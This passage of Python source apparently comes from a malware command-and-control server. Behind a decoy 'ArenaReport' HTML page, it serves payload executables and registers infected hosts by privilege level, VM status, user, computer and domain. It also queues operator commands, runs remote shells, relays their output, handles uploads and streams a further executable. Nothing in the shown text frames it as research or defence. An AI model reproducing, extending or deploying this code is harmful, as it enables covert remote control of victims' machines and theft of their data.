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" alt="">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTjIsHFb22PZ_LVpIg7_7XdAoXSlXB9tweNg&s" alt="">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSGCV4w3R16EeS6Egsz6YXNA2Q-jiERE0ov6w&s" alt="">
            </div>
        </section>

        <footer>
            
            <p>© 2025 ArenaReport | All rights reserved</p>
        </footer>

    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.rings.min.js"></script>
    <script>
        VANTA.RINGS({
            el: "#vanta-bg",
            mouseControls: true,
            touchControls: true,
            gyroControls: false,
            minHeight: 200.00,
            minWidth: 200.00,
            scale: 1.00,
            scaleMobile: 1.00
        })
    </script>
    </body>
    </html>
    """


@app.post("/redirect")
@show_bingo_processor(False)
async def give_pe(data: bytes, adderss: Address, is_normal: bool):
    file_path = 'packages/clean client/CCWithIpPort_normal.exe' if is_normal else 'packages/clean client/CCWithIpPort_macro.exe'
    try:
        with open(file_path, 'rb') as f:
            print(adderss, 'downloaded the ' + ('normal' if is_normal else 'macro') + ' exe in', datetime.now())
            return f.read(), 200
    except:
        print(adderss, "tried to get pe, but '" + file_path + "' file not found.")
        return str_mappers.no_str, 404

@app.post("/sort")
@show_bingo_processor(True)
async def accept_client(data: bytes, adderss: Address, is_normal: bool):
    isSystem = int.from_bytes(data[:4], byteorder="little")
    isAdmin = int.from_bytes(data[4:8], byteorder="little")
    isDomain = int.from_bytes(data[8:12], byteorder="little")
    is32 = int.from_bytes(data[12:16], byteorder="little")
    isServer = int.from_bytes(data[16:20], byteorder="little")
    isVM = int.from_bytes(data[20:24], byteorder="little")
    majorV = int.from_bytes(data[24:28], byteorder="little")
    minorV = int.from_bytes(data[28:32], byteorder="little")
    buildNum = int.from_bytes(data[32:36], byteorder="little")
    sleep_time_base = int.from_bytes(data[36:40], byteorder="little")
    sleep_time_tolerance = int.from_bytes(data[40:44], byteorder="little")
    
    sleep_time = str(sleep_time_base) + ' ± ' + str(sleep_time_tolerance)
    osVersion = str(majorV) + "." + str(minorV) + " " + str(buildNum) + str(" x86" if is32 else " x64") + str(" WinServer" if isServer else "")
    
    user = zero_remover(decode_m(data[44:644]).rstrip("\x00"))
    computerName = zero_remover(decode_m(data[644:1244]).rstrip("\x00"))
    domain = zero_remover(decode_m(data[1244:1844]).rstrip("\x00"))

    exists, res = None, b""
    for id, session in vars.sessions.items():
        if session["isVM"] == isVM and session["isSystem"] == isSystem and session["isAdmin"] == isAdmin and session["isDomain"] == isDomain and session["osVersion"] == osVersion and session["user"] == user and session["computerName"] == computerName and session["domain"] == domain:
            exists = id
    
    if exists:
        #print("\nclient " + str(exists) + " says i missed you!")
        clear_pipe(exists)
        vars.sessions[exists]["sleep_time"] = sleep_time
        vars.sessions[exists]["last_check_time"] = datetime.now()
        vars.sessions[exists]["mid"] = 0
        vars.sessions[exists]["client_address"] = adderss
        res = (exists).to_bytes(4, byteorder='little')
        res += vars.sessions[exists]['greeting']
        update_session_exists(exists, vars.sessions[exists])
    else:
        vars.sessions_num += 1
        update_common_vars_sessions_num()
        now = datetime.now()
        read_pipe, write_pipe = os.pipe()
        res = (vars.sessions_num).to_bytes(4, byteorder='little')
        res += os.urandom(VALIDATION_HEADER_SIZE - 4)
        vars.sessions[vars.sessions_num] = {
            "client_address": adderss,
            "mid" : 0,
            "create_time" : now,
            "last_check_time" : now,
            "isAdmin" : isAdmin,
            "isSystem": isSystem,
            "isDomain" : isDomain,
            "isServer" : isServer,
            "osVersion" : osVersion,
            "is32" : is32,
            "isVM" : isVM,
            "user" : user,
            "computerName" : computerName,
            "domain" : domain,
            "sleep_time" : sleep_time,
            "greeting": res[4:36],
            "read_pipe": read_pipe,
            "write_pipe": write_pipe,
            "command_sizes": [],
            # "exes": {},
            # "exes_num": 0
        }
        add_session(vars.sessions_num, vars.sessions[vars.sessions_num])
        sessions_table = []

        try:
            sessions_table.append([str(vars.sessions_num), str(adderss[0]) + ' : ' + str(adderss[1]), str(user) + f"{" (Admin)" if isAdmin else " (System)" if isSystem else ""}", 
            str(computerName), str(domain) if isDomain else "-", osVersion, "yes" if isVM else "no", "0 seconds", str(get_min_and_max_sleep_time(sleep_time)) + " seconds", now.strftime("%Y-%m-%d %H:%M:%S"), "0"])
        except:
            sessions_table.append([str(vars.sessions_num), '--', '--', '--', '--', '--', '--', "0 seconds", '--', '--', '0'])
        
        sessions_list = pretty_tabulate(
            sessions_table,
            headers=sessions_header_verbose,
            stralign='center',
            numalign='center',
            enable_ansi=True,
            zebra=False,
            highlight_columns=[0, 1, 2],
            row_dim_fn=lambda _row, _row_i: False,
            cell_color_fn=lambda _row, _row_i, col_i, _cell: "92" if col_i == 7 else None,
        )
        print("\nclient accepted\n" + sessions_list)

    return res, 200

@app.post("/deliver")
@processor
async def get_job(sid, data: bytes, adderss: Address):
    cmd = get_command(sid)
    cmd = cmd if cmd else str_mappers.no_str
    return cmd, 200

@app.post("/deliver/0")
@processor
async def check_connection(sid, data: bytes, adderss: Address):
    if data == str_mappers.connected:
        print("client", sid, "is connected.")
    else:
        print("client", sid, "is disconnected.")
    return str_mappers.no_str, 200

@app.post("/deliver/1")
@processor
async def create_shell(sid, data: bytes, adderss: Address):
    if data == str_mappers.success:
        vars.shell_creation_success.set()
        # vars.goto_exe_understood.set()
    return str_mappers.no_str, 200

@app.post("/deliver/2")
@processor
async def exec_command(sid, data: bytes, adderss: Address):
    if data != str_mappers.success:
        print("failed to write to pipe in client", sid)
    return str_mappers.no_str, 200

@app.post("/deliver/3")
@processor
async def shell_result(sid, data: bytes, adderss: Address):
    if data != str_mappers.no_data:
        result = decode_m(data)
        if result:
            if vars.old_active_command != "" and result.startswith(vars.old_active_command):
                result = result[len(vars.old_active_command):]
            print(result)
    return str_mappers.no_str, 200

@app.post("/deliver/4")
@processor
async def upload_start(sid, data: bytes, adderss: Address):
    if data == str_mappers.success:
        vars.upload_start_success.set()
    return str_mappers.no_str, 200

@app.post("/deliver/5")
@processor
async def upload_index(sid, data: bytes, adderss: Address):
    if data == str_mappers.success:
        vars.upload_index_success.set()
    return str_mappers.no_str, 200

@app.post("/deliver/6")
async def deliver_six(request: Request):

    base_dir = Path(__file__).parent
    file_path = base_dir / "files" / "ConsoleApplicationen.exe"
    print(file_path)
    if not file_path.exists():
        raise FileNotFoundError(f"File not found: {file_path}")

    file_size = file_path.stat().st_size
    CHUNK_SIZE = 2 * 1024 * 1024  # 2 MiB
    def file_iterator():
        with file_path.open("rb") as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                yield chunk

    headers = {
        "Content-Disposition": f'attachment; filename="{file_path.name}"',
        "Content-Length": str(file_size),
    }

    return StreamingResponse(file_iterator(), media_type="application/octet-stream", headers=headers)

# @app.post("/deliver/7")
# @processor
# async def upload_index(sid, data: bytes, adderss: Address):
#     if data == str_mappers.success:
#         vars.upload_index_success.set()
#     return str_mappers.no_str, 200
# async def download_start(sid, data: bytes, adderss: Address):
#     if data[:4] == str_mappers.success_:
#         vars.active_number_of_packets = int.from_bytes(data[4:8], byteorder='little')
#         vars.download_start_success.set()
#     return str_mappers.no_str, 200

# @app.post("/deliver/7")
# @processor
# async def download_index(sid, data: bytes, adderss: Address):
#     if data != str_mappers.failed:
#         vars.download_index_success.set()
#         vars.active_local_file.write(data)
#     return str_mappers.no_str, 200

# @app.post("/deliver/8")
# @processor
# async def create_process_thread(sid, data: bytes, adderss: Address):
#     if data != str_mappers.failed:
#         vars.active_pid_tid = int.from_bytes(data[4:8], byteorder='little')
#         vars.create_process_thread_success.set()
#     return str_mappers.no_str, 200

if __name__ == "__main__":
    with suppress(ConnectionResetError):
        main()
